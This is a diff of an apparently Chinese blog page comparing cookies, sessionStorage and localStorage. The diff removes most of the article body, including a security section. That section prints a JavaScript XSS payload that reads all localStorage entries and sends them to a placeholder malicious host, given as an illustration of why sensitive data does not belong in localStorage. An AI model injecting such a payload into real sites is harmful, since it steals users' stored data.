@@ -662,7 +662,7 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2 id="sessionStorage、localStorage、cookie都是在浏览器端存储的数据"><a href="#sessionStorage、localStorage、cookie都是在浏览器端存储的数据" class="headerlink" title="sessionStorage、localStorage、cookie都是在浏览器端存储的数据"></a>sessionStorage、localStorage、cookie都是在浏览器端存储的数据</h2><p>HTML5本地存储的前身就是Cookie，HTML5的本地存储是使localStorage对象将WEB数据持久化在本地。其中sessionStorage的概念很特别，引入了一个“浏览器窗口”的概念。sessionStorage是在同源的同窗口（或tab）中，始终存在的数据。也就是说只要这个浏览器窗口没有关闭，即使刷新页面或进入同源另一页面，数据仍然存在。关闭窗口后，sessionStorage即被销毁。</p>
+              <h2 id="sessionStorage、localStorage、cookie都是在浏览器端存储的数据"><a href="#sessionStorage、localStorage、cookie都是在浏览器端存储的数据" class="headerlink" title="sessionStorage、localStorage、cookie都是在浏览器端存储的数据"></a>sessionStorage、localStorage、cookie都是在浏览器端存储的数据</h2><p>HTML5本地存储的前身就是Cookie，HTML5的本地存储是使localStorage对象将WEB数据持久化在本地。其中sessionStorage的概念很特别，引入了一个“浏览器窗口”的概念。sessionStorage是在同源的同窗口（或tab）中，始终存在的数据。也就是说只要这个浏览器窗口没有关闭，即使刷新页面或进入同源另一页面，数据仍然存在。关闭窗口后，sessionStorage即被销毁。</p>
 <h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><h3 id="cookie的优点、缺点"><a href="#cookie的优点、缺点" class="headerlink" title="cookie的优点、缺点"></a>cookie的优点、缺点</h3><h4 id="优点【Advantages】"><a href="#优点【Advantages】" class="headerlink" title="优点【Advantages】"></a>优点【Advantages】</h4><blockquote>
 <p>极高的扩展性和可用性</p>
 </blockquote>
@@ -677,53 +677,7 @@
 <li>安全性问题。如果cookie被人拦截了，那人就可以取得所有的session信息。即使加密也与事无补，因为拦截者并不需要知道cookie的意义，他只要原样转发cookie就可以达到目的了。</li>
 <li>有些状态不可能保存在客户端。例如，为了防止重复提交表单，我们需要在服务器端保存一个计数器。如果我们把这个计数器保存在客户端，那么它起不到任何作用。</li>
 </ol>
-<p>&lt;– more –&gt;</p>
-<h2 id="浏览器本地存储webstorage"><a href="#浏览器本地存储webstorage" class="headerlink" title="浏览器本地存储webstorage"></a>浏览器本地存储webstorage</h2><p>在较高版本的浏览器中，js提供了sessionStorage和globalStorage。在HTML5中提供了localStorage来取代globalStorage。</p>
-<p>html5中的Web Storage包括了两种存储方式：sessionStorage和localStorage。</p>
-<p>sessionStorage用于本地存储一个会话【session】中的数据，这些数据只有在同一个会话中的页面才能访问并且当会话结束后数据也随之销毁。因此sessionStorage不是一种持久化的本地存储，仅仅是会话级别的存储。</p>
-<p>而localStorage用于持久化的本地存储，除非主动删除数据，否则数据是永远不会过期的。</p>
-<h4 id="Web-Storage带来的好处："><a href="#Web-Storage带来的好处：" class="headerlink" title="Web Storage带来的好处："></a>Web Storage带来的好处：</h4><ul>
-<li>减少网络流量：一旦数据保存在本地后，就可以避免再向服务器请求数据，因此减少不必要的数据请求，减少数据在浏览器和服务器间不必要地来回传递。</li>
-<li>快速显示数据：性能好，从本地读数据比通过网络从服务器获得数据快得多，本地数据可以即时获得。再加上网页本身也可以有缓存，因此整个页面和数据都在本地的话，可以立即显示。</li>
-<li>临时存储：很多时候数据只需要在用户浏览一组页面期间使用，关闭窗口后数据就可以丢弃了，这种情况使用sessionStorage非常方便。</li>
-</ul>
-<h2 id="web-storage和cookie的区别"><a href="#web-storage和cookie的区别" class="headerlink" title="web storage和cookie的区别"></a>web storage和cookie的区别</h2><p>先说一下共同点：都是保存在浏览器端，且同源的。</p>
-<p>Web Storage的概念和cookie相似，区别是它是为了更大容量存储设计的。Cookie的大小是受限的，并且每次你请求一个新的页面的时候Cookie都会被发送过去，这样无形中浪费了带宽，另外cookie还需要指定作用域，不可以跨域调用。</p>
-<p>除此之外，Web Storage拥有setItem,getItem,removeItem,clear等方法，不像cookie需要前端开发者自己封装setCookie，getCookie。</p>
-<p>但是cookie也是不可以或缺的：<strong>cookie的作用</strong>是与服务器进行交互，作为HTTP规范的一部分而存在 ，而Web Storage仅仅是为了在本地“存储”数据而生</p>
-<p>浏览器的支持除了IE７及以下不支持外，其他标准浏览器都完全支持(ie及FF需在web服务器里运行)，值得一提的是IE总是办好事，例如IE7、IE6中的userData其实就是javascript本地存储的解决方案。通过简单的代码封装可以统一到所有的浏览器都支持web storage。</p>
-<p>localStorage和sessionStorage都具有相同的操作方法，例如setItem、getItem和removeItem等。</p>
-<h3 id="为什么选择Web-Storage而不是Cookie？"><a href="#为什么选择Web-Storage而不是Cookie？" class="headerlink" title="为什么选择Web Storage而不是Cookie？"></a>为什么选择Web Storage而不是Cookie？</h3><p>与Cookie相比，Web Storage存在不少的优势，概括为以下几点：</p>
-<ol>
-<li><p>存储空间更大：IE8下每个独立的存储空间为10M，其他浏览器实现略有不同，但都比Cookie要大很多。</p>
-</li>
-<li><p>存储内容不会发送到服务器：当设置了Cookie后，Cookie的内容会随着请求一并发送的服务器，这对于本地存储的数据是一种带宽浪费。而Web Storage中的数据则仅仅是存在本地，不会与服务器发生任何交互。</p>
-</li>
-<li><p>更多丰富易用的接口：Web Storage提供了一套更为丰富的接口，使得数据操作更为简便。</p>
-</li>
-<li><p>独立的存储空间：每个域（包括子域）有独立的存储空间，各个存储空间是完全独立的，因此不会造成数据混乱。</p>
-</li>
-</ol>
-<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>因为考虑到每个 HTTP 请求都会带着 Cookie 的信息，所以 Cookie 当然是能精简就精简啦，比较常用的一个应用场景就是判断用户是否登录。<br>针对登录过的用户，服务器端会在他登录时往 Cookie 中插入一段加密过的唯一辨识单一用户的辨识码，下次只要读取这个值就可以判断当前用户是否登录啦。<br>曾经还使用 Cookie 来保存用户在电商网站的购物车信息，如今有了 localStorage，就可以利用localStorage代替cookie了。<br>而另一方面 localStorage 接替了 Cookie 管理购物车的工作，同时也能胜任其他一些工作。比如Html5游戏通常会产生一些本地数据，localStorage 也是非常适用的。如果遇到一些内容特别多的表单，为了优化用户体验，我们可能要把表单页面拆分成多个子页面，然后按步骤引导用户填写。这时候 sessionStorage 的作用就发挥出来了。</p>
-<h2 id="安全性的考虑"><a href="#安全性的考虑" class="headerlink" title="安全性的考虑"></a>安全性的考虑</h2><p>需要注意的是，不是什么数据都适合放在 Cookie、localStorage 和 sessionStorage 中的。使用它们的时候，<br>需要时刻注意是否有代码存在 XSS 注入的风险。因为只要打开控制台，你就随意修改它们的值，也就是说如果你的网站中有 XSS 的风险，<br>它们就能对你的 localStorage 肆意妄为。所以千万不要用它们存储你系统中的敏感数据。但是cookie可以采取一些策略来预防XSS攻击。 </p>
-<p>那么</p>
-<h2 id="是否可以代替Cookie"><a href="#是否可以代替Cookie" class="headerlink" title="是否可以代替Cookie"></a>是否可以代替Cookie</h2><p>浏览器使用Cookie进行身份验证已经好多年，那现在既然localStorage存储空间那么大，是否可以把身份验证的数据直接移植过来呢。以现在来看，把身份验证数据使用localStorage进行存储还不太成熟。我们知道，通常可以使用XSS漏洞来获取到Cookie，然后用这个Cookie进行身份验证登录。后来为了防止通过XSS获取Cookie数据，浏览器支持了使用HTTPONLY来保护Cookie不被XSS攻击获取到。而localStorage存储没有对XSS攻击有任何的抵御机制。一旦出现XSS漏洞，那么存储在localStorage里的数据就极易被获取到。 </p>
-<p>如果一个网站存在XSS漏洞，那么攻击者注入如下代码，就可以获取使用localStorage存储在本地的所有信息。<br>Js代码</p>
-<pre><code>var i = 0;  
-var str = &quot;&quot;;  
-while (localStorage.key(i) != null)  
-{  
-    var key = localStorage.key(i);   
-    str += key + &quot;: &quot; + localStorage.getItem(key);  
-    i++;  
-}  
-document.location=&quot;http://your-malicious-site.com?stolen=&quot;+ str;  
-</code></pre><p>攻击者也可以简单的使用localStorage.removeItem(key)和localStorage.clear()对存储数据进行清空。  </p>
-<p>####最后推荐几篇文章：<br><a href="http://zccst.iteye.com/blog/2194344" target="_blank" rel="external">http://zccst.iteye.com/blog/2194344</a></p>
-<p><a href="http://mp.weixin.qq.com/s?__biz=MzAwNzgxMjYzMA==&amp;mid=401640151&amp;idx=1&amp;sn=7057582917c3c477c55e7deb74a83e88#rd&amp;utm_source=tuicool&amp;utm_medium=referral" target="_blank" rel="external">http://mp.weixin.qq.com/s?__biz=MzAwNzgxMjYzMA==&amp;amp</a></p>
-<p><a href="http://blog.csdn.net/cwzhsi/article/details/49557879" target="_blank" rel="external">http://blog.csdn.net/cwzhsi/article/details/49557879</a></p>
-<hr>
-
+          
       
     </div>
     
@@ -740,6 +694,10 @@ document.location=&quot;http://your-malicious-site.com?stolen=&quot;+ str;
         <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cookie/">cookie</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/localstorage/">localstorage</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sessionStorage/">sessionStorage</a></li></ul>
     </div>
 
+      
+        <p class="article-more-link">
+          <a href="/2016/03/30/cookiewebstorage/#more">more >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
